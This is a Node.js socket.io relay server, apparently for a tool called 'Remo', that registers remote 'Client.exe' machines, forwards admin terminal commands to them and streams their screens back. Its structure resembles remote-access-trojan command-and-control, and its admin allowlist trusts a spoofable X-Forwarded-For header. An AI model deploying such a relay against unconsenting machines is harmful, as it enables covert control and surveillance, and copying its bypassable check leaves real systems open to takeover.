const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());
const server = http.createServer(app);
const io = new Server(server, {
    cors: {
        origin: ["http://localhost:3000", "http://127.0.0.1:5500", "https://quadroiscoding.github.io"],
        methods: ["GET", "POST"]
    },
    maxHttpBufferSize: 1e7 // Increase limit for RDP frames (10MB)
});

// Configure Allowed Admin IPs here
const ALLOWED_ADMIN_IPS = [
    '::1', '127.0.0.1',           // Localhost
    '10.107.138.176',             // User WLAN
    '100.103.139.7',              // User Tailscale
    '192.168.56.1'                // User Ethernet (VirtualBox often uses this range)
];

let clients = {}; // Register of connected Client.exe instances
let admins = {};  // Register of connected Control Panel instances

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    // Identify as Client or Admin
    socket.on('register', (data) => {
        if (data.type === 'client') {
            clients[socket.id] = {
                id: socket.id,
                name: data.name || `UNK-${socket.id.substring(0, 4)}`,
                ip: socket.handshake.address.replace('::ffff:', ''),
                country: data.country || 'Unknown',
                countryCode: data.countryCode || 'un',
                os: data.os || 'Windows',
                status: 'online',
                lastSeen: new Date()
            };
            console.log(`Client Registered: ${clients[socket.id].name} (${clients[socket.id].ip})`);
            broadcastToAdmins('client_list', Object.values(clients));
        } else if (data.type === 'admin') {
            // Check for X-Forwarded-For header (useful if behind a proxy like Heroku/Render)
            const forwardedFor = socket.handshake.headers['x-forwarded-for'];
            const clientIp = forwardedFor ? forwardedFor.split(',')[0].trim() : socket.handshake.address.replace('::ffff:', '');

            if (!ALLOWED_ADMIN_IPS.includes(clientIp)) {
                console.warn(`Blocked unauthorized admin attempt from: ${clientIp}`);
                socket.emit('error', 'Unauthorized: IP not specified in server whitelist.');
                socket.disconnect();
                return;
            }
            admins[socket.id] = true;
            console.log(`Admin Dashboard Connected (IP: ${clientIp})`);
            socket.emit('client_list', Object.values(clients));
        }
    });

    // Handling Terminal (SSH) Commands
    socket.on('terminal_input', (data) => {
        // data: { targetId, command }
        if (clients[data.targetId]) {
            io.to(data.targetId).emit('terminal_command', { command: data.command });
        }
    });

    socket.on('terminal_output', (data) => {
        // data: { output }
        broadcastToAdmins('terminal_data', {
            clientId: socket.id,
            output: data.output
        });
    });

    // Handling RDP Stream
    socket.on('rdp_request', (data) => {
        if (clients[data.targetId]) {
            io.to(data.targetId).emit('rdp_start', { active: data.active });
        }
    });

    socket.on('rdp_frame', (data) => {
        // data: { image } (Base64 or Binary)
        broadcastToAdmins('rdp_data', {
            clientId: socket.id,
            image: data.image
        });
    });

    socket.on('disconnect', () => {
        if (clients[socket.id]) {
            console.log(`Client Disconnected: ${clients[socket.id].name}`);
            delete clients[socket.id];
            broadcastToAdmins('client_list', Object.values(clients));
        }
        delete admins[socket.id];
    });
});

function broadcastToAdmins(event, data) {
    Object.keys(admins).forEach(adminId => {
        io.to(adminId).emit(event, data);
    });
}

const PORT = 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Remo Relay Server running on http://0.0.0.0:${PORT}`);
});
